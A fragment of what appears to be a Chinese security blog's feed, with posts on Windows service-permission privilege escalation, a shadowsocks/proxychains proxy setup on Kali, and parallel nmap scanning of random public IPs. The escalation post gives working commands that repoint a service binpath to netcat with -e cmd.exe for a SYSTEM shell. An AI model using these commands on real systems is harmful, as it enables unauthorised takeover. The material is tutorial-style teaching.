class="line">        TAG                : 0</div><div class="line">        DISPLAY_NAME       : Print Spooler</div><div class="line">        DEPENDENCIES       : RPCSS</div><div class="line">                           : http</div><div class="line">        SERVICE_START_NAME : LocalSystem</div></pre></td></tr></table></figure>
<h4 id="我们也可以使用accesschk-来检查每个服务的权限级别"><a href="#我们也可以使用accesschk-来检查每个服务的权限级别" class="headerlink" title="我们也可以使用accesschk 来检查每个服务的权限级别"></a>我们也可以使用accesschk 来检查每个服务的权限级别</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"># We can see the permissions that each user level has, you can also use &quot;accesschk.exe -ucqv *&quot; to list</div><div class="line">all services.</div><div class="line"></div><div class="line">C:\&gt; accesschk.exe -ucqv Spooler</div><div class="line"></div><div class="line">Spooler</div><div class="line"></div><div class="line">  R  NT AUTHORITY\Authenticated Users</div><div class="line">        SERVICE_QUERY_STATUS</div><div class="line">        SERVICE_QUERY_CONFIG</div><div class="line">        SERVICE_INTERROGATE</div><div class="line">        SERVICE_ENUMERATE_DEPENDENTS</div><div class="line">        SERVICE_USER_DEFINED_CONTROL</div><div class="line">        READ_CONTROL</div><div class="line">  R  BUILTIN\Power Users</div><div class="line">        SERVICE_QUERY_STATUS</div><div class="line">        SERVICE_QUERY_CONFIG</div><div class="line">        SERVICE_INTERROGATE</div><div class="line">        SERVICE_ENUMERATE_DEPENDENTS</div><div class="line">        SERVICE_START</div><div class="line">        SERVICE_USER_DEFINED_CONTROL</div><div class="line">        READ_CONTROL</div><div class="line">  RW BUILTIN\Administrators</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\SYSTEM</div><div class="line">        SERVICE_ALL_ACCESS</div></pre></td></tr></table></figure>
<h4 id="Accesschk-能够自动检查在某个用户等级下我们对于Windows-服务是否具有写入权限。作为一个低权限的用户，我们通常会想要去检查-“Authenticated-Users”-。"><a href="#Accesschk-能够自动检查在某个用户等级下我们对于Windows-服务是否具有写入权限。作为一个低权限的用户，我们通常会想要去检查-“Authenticated-Users”-。" class="headerlink" title="Accesschk 能够自动检查在某个用户等级下我们对于Windows 服务是否具有写入权限。作为一个低权限的用户，我们通常会想要去检查 “Authenticated Users” 。"></a>Accesschk 能够自动检查在某个用户等级下我们对于Windows 服务是否具有写入权限。作为一个低权限的用户，我们通常会想要去检查 “Authenticated Users” 。</h4><h4 id="咱们来比较一下在Windows-8-和-Windows-XP-SP0-中输出的不同"><a href="#咱们来比较一下在Windows-8-和-Windows-XP-SP0-中输出的不同" class="headerlink" title="咱们来比较一下在Windows 8 和 Windows XP SP0 中输出的不同,"></a>咱们来比较一下在Windows 8 和 Windows XP SP0 中输出的不同,</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"># This is on Windows 8.</div><div class="line"></div><div class="line">C:\Users\b33f\tools\Sysinternals&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; *</div><div class="line">No matching objects found.</div><div class="line"></div><div class="line"># On a default Windows XP SP0 we can see there is a pretty big security fail.</div><div class="line"></div><div class="line">C:\&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; *</div><div class="line">RW SSDPSRV</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">RW upnphost</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">		</div><div class="line">C:\&gt; accesschk.exe -ucqv SSDPSRV</div><div class="line"></div><div class="line">SSDPSRV</div><div class="line"></div><div class="line">  RW NT AUTHORITY\SYSTEM</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW BUILTIN\Administrators</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\Authenticated Users</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW BUILTIN\Power Users</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\LOCAL SERVICE</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line"></div><div class="line">C:\&gt; accesschk.exe -ucqv upnphost</div><div class="line"></div><div class="line">upnphost</div><div class="line"></div><div class="line">  RW NT AUTHORITY\SYSTEM</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW BUILTIN\Administrators</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\Authenticated Users</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW BUILTIN\Power Users</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\LOCAL SERVICE</div><div class="line">        SERVICE_ALL_ACCESS</div></pre></td></tr></table></figure>
<h4 id="通过以上信息，我们能看到upnphost-具有很大的权限，下面我将演示一下如何实际应用这些信息来反弹-system-shell"><a href="#通过以上信息，我们能看到upnphost-具有很大的权限，下面我将演示一下如何实际应用这些信息来反弹-system-shell" class="headerlink" title="通过以上信息，我们能看到upnphost 具有很大的权限，下面我将演示一下如何实际应用这些信息来反弹 system shell"></a>通过以上信息，我们能看到upnphost 具有很大的权限，下面我将演示一下如何实际应用这些信息来反弹 system shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">C:\&gt; sc qc upnphost</div><div class="line"></div><div class="line">[SC] GetServiceConfig SUCCESS</div><div class="line"></div><div class="line">SERVICE_NAME: upnphost</div><div class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</div><div class="line">        START_TYPE         : 3   DEMAND_START</div><div class="line">        ERROR_CONTROL      : 1   NORMAL</div><div class="line">        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService</div><div class="line">        LOAD_ORDER_GROUP   :</div><div class="line">        TAG                : 0</div><div class="line">        DISPLAY_NAME       : Universal Plug and Play Device Host</div><div class="line">        DEPENDENCIES       : SSDPSRV</div><div class="line">        SERVICE_START_NAME : NT AUTHORITY\LocalService</div><div class="line">		</div><div class="line">C:\&gt; sc config upnphost binpath= &quot;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&quot;</div><div class="line">[SC] ChangeServiceConfig SUCCESS</div><div class="line"></div><div class="line">C:\&gt; sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</div><div class="line">[SC] ChangeServiceConfig SUCCESS</div><div class="line"></div><div class="line">C:\&gt; sc qc upnphost</div><div class="line"></div><div class="line">[SC] GetServiceConfig SUCCESS</div><div class="line"></div><div class="line">SERVICE_NAME: upnphost</div><div class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</div><div class="line">        START_TYPE         : 3   DEMAND_START</div><div class="line">        ERROR_CONTROL      : 1   NORMAL</div><div class="line">        BINARY_PATH_NAME   : C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe</div><div class="line">        LOAD_ORDER_GROUP   :</div><div class="line">        TAG                : 0</div><div class="line">        DISPLAY_NAME       : Universal Plug and Play Device Host</div><div class="line">        DEPENDENCIES       : SSDPSRV</div><div class="line">        SERVICE_START_NAME : LocalSystem</div><div class="line">		</div><div class="line">C:\&gt; net start upnphost</div></pre></td></tr></table></figure>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180410151231_nF2KHi_Screenshot.jpeg" alt=""></p>
<h4 id="下图列出了关于Windows-提权的一些介绍，任何这些访问权限都将给我们带来SYSTEM-shell"><a href="#下图列出了关于Windows-提权的一些介绍，任何这些访问权限都将给我们带来SYSTEM-shell" class="headerlink" title="下图列出了关于Windows 提权的一些介绍，任何这些访问权限都将给我们带来SYSTEM shell."></a>下图列出了关于Windows 提权的一些介绍，任何这些访问权限都将给我们带来SYSTEM shell.</h4><p><img src="http://www.fuzzysecurity.com/tutorials/images/priv02_big.png" alt=""></p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><h4 id="以上大部分都是根据外文翻译过来的，然后我做了适当修改，再次感谢大哥-hl0rey-的建议和帮助，下一篇文章将是我自己的思路总结，将会更有趣也更加容易操作！！"><a href="#以上大部分都是根据外文翻译过来的，然后我做了适当修改，再次感谢大哥-hl0rey-的建议和帮助，下一篇文章将是我自己的思路总结，将会更有趣也更加容易操作！！" class="headerlink" title="以上大部分都是根据外文翻译过来的，然后我做了适当修改，再次感谢大哥@hl0rey 的建议和帮助，下一篇文章将是我自己的思路总结，将会更有趣也更加容易操作！！"></a>以上大部分都是根据外文翻译过来的，然后我做了适当修改，再次感谢大哥@hl0rey 的建议和帮助，下一篇文章将是我自己的思路总结，将会更有趣也更加容易操作！！</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h2&gt;&lt;h4 id=&quot;本篇教程是笔者翻译国外大牛fuzzysecurity-的文章再加上个人的理解写出的关于Windows-提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢-hl0rey-的帮助和建议。&quot;&gt;&lt;a href=&quot;#本篇教程是笔者翻译国外大牛fuzzysecurity-的文章再加上个人的理解写出的关于Windows-提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢-hl0rey-的帮助和建议。&quot; class=&quot;headerlink&quot; title=&quot;本篇教程是笔者翻译国外大牛fuzzysecurity 的文章再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。&quot;&gt;&lt;/a&gt;本篇教程是笔者翻译国外&lt;a href=&quot;http://www.fuzzysecurity.com/tutorials/16.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;大牛fuzzysecurity 的文章&lt;/a&gt;再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>kali 代理之shadowsocks &amp; proxychains</title>
    <link href="http://TimeS0ng.github.io/2018/03/30/kali-%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks-proxychains/"/>
    <id>http://TimeS0ng.github.io/2018/03/30/kali-代理之shadowsocks-proxychains/</id>
    <published>2018-03-30T09:14:16.000Z</published>
    <updated>2018-03-30T09:15:40.739Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-最近和朋友合租了一台vps-，我搭好ss-bbr-之后居然不知道如何给kali-配置代理，真是可耻，果然Mac-用惯了之后人都会变懒！找了很久发现好多关于kali-代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！"><a href="#emsp-emsp-最近和朋友合租了一台vps-，我搭好ss-bbr-之后居然不知道如何给kali-配置代理，真是可耻，果然Mac-用惯了之后人都会变懒！找了很久发现好多关于kali-代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！" class="headerlink" title="&emsp;&emsp;最近和朋友合租了一台vps ，我搭好ss + bbr 之后居然不知道如何给kali 配置代理，真是可耻，果然Mac 用惯了之后人都会变懒！找了很久发现好多关于kali 代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！"></a>&emsp;&emsp;最近和朋友合租了一台vps ，我搭好ss + bbr 之后居然不知道如何给kali 配置代理，真是可耻，果然Mac 用惯了之后人都会变懒！找了很久发现好多关于kali 代理的文章都失效，不过我还是在网上找到了<a href="https://blog.csdn.net/qq_27766969/article/details/71593611" target="_blank" rel="external">这篇文章</a>，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！</h4><a id="more"></a>
<h2 id="0x01-代理流程"><a href="#0x01-代理流程" class="headerlink" title="0x01. 代理流程"></a>0x01. 代理流程</h2><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180330161820_C3BORx_Screenshot.jpeg" alt=""></p>
<h4 id="好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！"><a href="#好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！" class="headerlink" title="好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！"></a>好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！</h4><ul>
<li>首先通过proxychains 将本地流量发往localhost 的 1080 端口</li>
<li>localhost 的1080 端口和VPS 的8080 端口通过shadowsocks 建立 ss 连接</li>
<li>本地流量 -&gt; localhost 1080 -&gt; VPS 8080 -&gt; 目标站点</li>
</ul>
<h4 id="以上就是ss-代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置"><a href="#以上就是ss-代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置" class="headerlink" title="以上就是ss 代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置"></a>以上就是ss 代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置</h4><h2 id="0x02-配置-proxychains"><a href="#0x02-配置-proxychains" class="headerlink" title="0x02. 配置 proxychains"></a>0x02. 配置 proxychains</h2><blockquote>
<p>vim /etc/proxychains.conf</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180330163334_xF5VwI_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-配置shadowsocks"><a href="#0x03-配置shadowsocks" class="headerlink" title="0x03. 配置shadowsocks"></a>0x03. 配置shadowsocks</h2><h4 id="1-安装shadowsocks"><a href="#1-安装shadowsocks" class="headerlink" title="1. 安装shadowsocks"></a>1. 安装shadowsocks</h4><blockquote>
<p>apt-get install python-pip &amp;&amp; pip install shadowsocks</p>
</blockquote>
<h4 id="2-优化shadowsocks-，这里我也不懂优化策略"><a href="#2-优化shadowsocks-，这里我也不懂优化策略" class="headerlink" title="2. 优化shadowsocks ，这里我也不懂优化策略"></a>2. 优化shadowsocks ，这里我也不懂优化策略</h4><blockquote>
<p>vim  /etc/sysctl.d/local.conf</p>
<p>sysctl –system  &emsp; # 优化文件保存之后执行这条命令生效 </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"># max open files</div><div class="line">fs.file-max = 51200  </div><div class="line"># max read buffer</div><div class="line">net.core.rmem_max = 67108864  </div><div class="line"># max write buffer</div><div class="line">net.core.wmem_max = 67108864  </div><div class="line"># default read buffer</div><div class="line">net.core.rmem_default = 65536  </div><div class="line"># default write buffer</div><div class="line">net.core.wmem_default = 65536  </div><div class="line"># max processor input queue</div><div class="line">net.core.netdev_max_backlog = 4096  </div><div class="line"># max backlog</div><div class="line">net.core.somaxconn = 4096</div><div class="line"></div><div class="line"># resist SYN flood attacks</div><div class="line">net.ipv4.tcp_syncookies = 1  </div><div class="line"># reuse timewait sockets when safe</div><div class="line">net.ipv4.tcp_tw_reuse = 1  </div><div class="line"># turn off fast timewait sockets recycling</div><div class="line">net.ipv4.tcp_tw_recycle = 0  </div><div class="line"># short FIN timeout</div><div class="line">net.ipv4.tcp_fin_timeout = 30  </div><div class="line"># short keepalive time</div><div class="line">net.ipv4.tcp_keepalive_time = 1200  </div><div class="line"># outbound port range</div><div class="line">net.ipv4.ip_local_port_range = 10000 65000  </div><div class="line"># max SYN backlog</div><div class="line">net.ipv4.tcp_max_syn_backlog = 4096  </div><div class="line"># max timewait sockets held by system simultaneously</div><div class="line">net.ipv4.tcp_max_tw_buckets = 5000  </div><div class="line"># turn on TCP Fast Open on both client and server side</div><div class="line">net.ipv4.tcp_fastopen = 3  </div><div class="line"># TCP receive buffer</div><div class="line">net.ipv4.tcp_rmem = 4096 87380 67108864  </div><div class="line"># TCP write buffer</div><div class="line">net.ipv4.tcp_wmem = 4096 65536 67108864  </div><div class="line"># turn on path MTU discovery</div><div class="line">net.ipv4.tcp_mtu_probing = 1</div><div class="line"></div><div class="line"># for high-latency network</div><div class="line">net.ipv4.tcp_congestion_control = hybla</div><div class="line"></div><div class="line"># for low-latency network, use cubic instead</div><div class="line"># net.ipv4.tcp_congestion_control = cubic</div></pre></td></tr></table></figure>
<h4 id="3-配置Shadowsocks配置文件"><a href="#3-配置Shadowsocks配置文件" class="headerlink" title="3. 配置Shadowsocks配置文件"></a>3. 配置Shadowsocks配置文件</h4><blockquote>
<p>mkdir /root/ss &amp;&amp; cd /root/ss &amp;&amp; vim ssserver.json</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&#123;</div><div class="line">    &quot;server&quot;: &quot;my_server_ip&quot;, // 这里输入墙外服务器地址</div><div class="line">    &quot;server_port&quot;: 8080, // 墙外服务器的端口</div><div class="line">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,</div><div class="line">    &quot;local_port&quot;: 1080, // 为了安全，可修改为大于 1024 的数字</div><div class="line">    &quot;password&quot;: &quot;mypassword&quot;, // 设置一个密码</div><div class="line">    &quot;timeout&quot;: 300,</div><div class="line">    &quot;method&quot;: &quot;aes-256-cfb&quot;,//要和服务端的加密方式相同</div><div class="line">    &quot;fast_open&quot;: false</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="4-修改-python-配置文件，不然运行不了-ss"><a href="#4-修改-python-配置文件，不然运行不了-ss" class="headerlink" title="4. 修改 python 配置文件，不然运行不了 ss"></a>4. 修改 python 配置文件，不然运行不了 ss</h4><blockquote>
<p>vim /usr/local/lib/python2.7/dist-packages/shadowsocks/crypto/openssl.py &emsp; # 修改成如下所示</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180330164846_7aMRN6_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180330165005_QFOnfG_Screenshot.jpeg" alt=""></p>
<h4 id="5-现在可以启动-ss-使用代理，在要使用代理的应用前加proxychains-即可"><a href="#5-现在可以启动-ss-使用代理，在要使用代理的应用前加proxychains-即可" class="headerlink" title="5. 现在可以启动 ss 使用代理，在要使用代理的应用前加proxychains 即可"></a>5. 现在可以启动 ss 使用代理，在要使用代理的应用前加proxychains 即可</h4><blockquote>
<p>sslocal -c /root/ss/ssserver.json -d start &emsp; # 重启之后需要再次运行该命令启动 ss</p>
<p>proxychains curl ip.cn</p>
<p>proxychains firefox</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180330165447_bwVCOz_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180330165823_L4SdgT_Screenshot.jpeg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-最近和朋友合租了一台vps-，我搭好ss-bbr-之后居然不知道如何给kali-配置代理，真是可耻，果然Mac-用惯了之后人都会变懒！找了很久发现好多关于kali-代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！&quot;&gt;&lt;a href=&quot;#emsp-emsp-最近和朋友合租了一台vps-，我搭好ss-bbr-之后居然不知道如何给kali-配置代理，真是可耻，果然Mac-用惯了之后人都会变懒！找了很久发现好多关于kali-代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;最近和朋友合租了一台vps ，我搭好ss + bbr 之后居然不知道如何给kali 配置代理，真是可耻，果然Mac 用惯了之后人都会变懒！找了很久发现好多关于kali 代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;最近和朋友合租了一台vps ，我搭好ss + bbr 之后居然不知道如何给kali 配置代理，真是可耻，果然Mac 用惯了之后人都会变懒！找了很久发现好多关于kali 代理的文章都失效，不过我还是在网上找到了&lt;a href=&quot;https://blog.csdn.net/qq_27766969/article/details/71593611&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这篇文章&lt;/a&gt;，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>bash 伪多进程</title>
    <link href="http://TimeS0ng.github.io/2018/03/28/bash-%E4%BC%AA%E5%A4%9A%E8%BF%9B%E7%A8%8B/"/>
    <id>http://TimeS0ng.github.io/2018/03/28/bash-伪多进程/</id>
    <published>2018-03-28T13:57:03.000Z</published>
    <updated>2018-03-28T13:59:37.072Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-最近研究ident-user-enum-这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113-端口的主机，然而互联网实在是太大了，但是开着113-端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！"><a href="#emsp-emsp-最近研究ident-user-enum-这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113-端口的主机，然而互联网实在是太大了，但是开着113-端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！" class="headerlink" title="&emsp;&emsp;最近研究ident-user-enum 这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113 端口的主机，然而互联网实在是太大了，但是开着113 端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！"></a>&emsp;&emsp;最近研究ident-user-enum 这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113 端口的主机，然而互联网实在是太大了，但是开着113 端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！</h4><a id="more"></a>
<h2 id="0x01-脚本分析"><a href="#0x01-脚本分析" class="headerlink" title="0x01. 脚本分析"></a>0x01. 脚本分析</h2><blockquote>
<ol>
<li>首先我用了两个for 循环进行嵌套，然后用了&amp;&emsp;wait 来开设伪进程，就相当于里层循环正常执行，但是外层循环会被置于后台，这样我们相当于同时开了三个进程来进行里层循环，所以总共需要9 s 来运行整个脚本，而不是27 s 当然你也可以将里层循环也开启伪进程，不过后面扫公网时我不希望自己开的进程达到数万个，所以我这里没有加</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180314170109_LlEaRr_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180314170326_OXxGMH_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>理论分析完了，现在来看看我扫描公网时用的脚本，相当于我开了100 个进程，然后随即扫描公网中开放113 端口的主机</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180314171237_IoEvHX_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>当启动脚本后，CPU 瞬间爆炸，后台也全是nmap 进程，我总共扫了1 w 个随机 IP ，结果只有8 个IP 开放了113 端口，不过只花费了4 min </li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180314171711_pAgsuO_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-结语"><a href="#0x02-结语" class="headerlink" title="0x02. 结语"></a>0x02. 结语</h2><h4 id="emsp-emsp-大家可以点击这里在bilibili-查看我的视屏演示"><a href="#emsp-emsp-大家可以点击这里在bilibili-查看我的视屏演示" class="headerlink" title="&emsp;&emsp;大家可以点击这里在bilibili 查看我的视屏演示"></a>&emsp;&emsp;大家可以点击这里在bilibili 查看我的<a href="https://www.bilibili.com/video/av20765871/" target="_blank" rel="external">视屏演示</a></h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-最近研究ident-user-enum-这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113-端口的主机，然而互联网实在是太大了，但是开着113-端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！&quot;&gt;&lt;a href=&quot;#emsp-emsp-最近研究ident-user-enum-这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113-端口的主机，然而互联网实在是太大了，但是开着113-端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;最近研究ident-user-enum 这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113 端口的主机，然而互联网实在是太大了，但是开着113 端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;最近研究ident-user-enum 这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113 端口的主机，然而互联网实在是太大了，但是开着113 端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Firewalk 原理</title>
    <link href="http://TimeS0ng.github.io/2018/03/10/Firewalk-%E5%8E%9F%E7%90%86/"/>
    <id>http://TimeS0ng.github.io/2018/03/10/Firewalk-原理/</id>
    <published>2018-03-10T11:42:44.000Z</published>
    <updated>2018-03-10T11:59:13.733Z</updated>
    
